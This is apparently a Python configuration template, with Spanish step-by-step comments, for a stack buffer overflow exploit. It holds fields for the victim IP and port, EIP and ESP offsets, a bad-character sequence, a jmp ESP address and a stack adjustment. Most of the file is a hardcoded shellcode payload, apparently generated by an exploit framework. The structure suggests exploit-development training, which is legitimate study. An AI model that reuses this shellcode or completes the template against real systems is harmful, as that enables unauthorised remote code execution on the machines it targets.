# PASO I
# ip máquina victima
rhost = ''

# puerto máquina victima
rport = 

# timeout conexión en segundos
timeout = 10

# PASO II
# pattern
pattern = b''

# PASO III
# offset EIP
offsetEIP = 0

# offset ESP
offsetESP = 0

# tamaño total del buffer a enviar
buffer = 3000

# PASO IV
badchars = [] # badchars = [0x00, 0x0a, 0x0d]
badcharsSequence = bytes(c for c in range(256) if c not in badchars)

# PASO V
# dirección de la operación jmp ESP
jmpESP = 0x11223344 # jmpESP = 0x11223344

# PASO VI
# subir ESP en la pila (stack)
upESP = b'\x83\xec\x10'

# shellcode
shellcode =  b""
shellcode += b"\xba\xfc\xd0\xb0\x72\xda\xc1\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x52\x83\xc7\x04\x31\x57\x0e"
shellcode += b"\x03\xab\xde\x52\x87\xaf\x37\x10\x68\x4f\xc8"
shellcode += b"\x75\xe0\xaa\xf9\xb5\x96\xbf\xaa\x05\xdc\xed"
shellcode += b"\x46\xed\xb0\x05\xdc\x83\x1c\x2a\x55\x29\x7b"
shellcode += b"\x05\x66\x02\xbf\x04\xe4\x59\xec\xe6\xd5\x91"
shellcode += b"\xe1\xe7\x12\xcf\x08\xb5\xcb\x9b\xbf\x29\x7f"
shellcode += b"\xd1\x03\xc2\x33\xf7\x03\x37\x83\xf6\x22\xe6"
shellcode += b"\x9f\xa0\xe4\x09\x73\xd9\xac\x11\x90\xe4\x67"
shellcode += b"\xaa\x62\x92\x79\x7a\xbb\x5b\xd5\x43\x73\xae"
shellcode += b"\x27\x84\xb4\x51\x52\xfc\xc6\xec\x65\x3b\xb4"
shellcode += b"\x2a\xe3\xdf\x1e\xb8\x53\x3b\x9e\x6d\x05\xc8"
shellcode += b"\xac\xda\x41\x96\xb0\xdd\x86\xad\xcd\x56\x29"
shellcode += b"\x61\x44\x2c\x0e\xa5\x0c\xf6\x2f\xfc\xe8\x59"
shellcode += b"\x4f\x1e\x53\x05\xf5\x55\x7e\x52\x84\x34\x17"
shellcode += b"\x97\xa5\xc6\xe7\xbf\xbe\xb5\xd5\x60\x15\x51"
shellcode += b"\x56\xe8\xb3\xa6\x99\xc3\x04\x38\x64\xec\x74"
shellcode += b"\x11\xa3\xb8\x24\x09\x02\xc1\xae\xc9\xab\x14"
shellcode += b"\x60\x99\x03\xc7\xc1\x49\xe4\xb7\xa9\x83\xeb"
shellcode += b"\xe8\xca\xac\x21\x81\x61\x57\xa2\xa4\x75\x57"
shellcode += b"\x45\xd1\x77\x57\xae\x5e\xf1\xb1\xda\xb0\x57"
shellcode += b"\x6a\x73\x28\xf2\xe0\xe2\xb5\x28\x8d\x25\x3d"
shellcode += b"\xdf\x72\xeb\xb6\xaa\x60\x9c\x36\xe1\xda\x0b"
shellcode += b"\x48\xdf\x72\xd7\xdb\x84\x82\x9e\xc7\x12\xd5"
shellcode += b"\xf7\x36\x6b\xb3\xe5\x61\xc5\xa1\xf7\xf4\x2e"
shellcode += b"\x61\x2c\xc5\xb1\x68\xa1\x71\x96\x7a\x7f\x79"
shellcode += b"\x92\x2e\x2f\x2c\x4c\x98\x89\x86\x3e\x72\x40"
shellcode += b"\x74\xe9\x12\x15\xb6\x2a\x64\x1a\x93\xdc\x88"
shellcode += b"\xab\x4a\x99\xb7\x04\x1b\x2d\xc0\x78\xbb\xd2"
shellcode += b"\x1b\x39\xdb\x30\x89\x34\x74\xed\x58\xf5\x19"
shellcode += b"\x0e\xb7\x3a\x24\x8d\x3d\xc3\xd3\x8d\x34\xc6"
shellcode += b"\x98\x09\xa5\xba\xb1\xff\xc9\x69\xb1\xd5"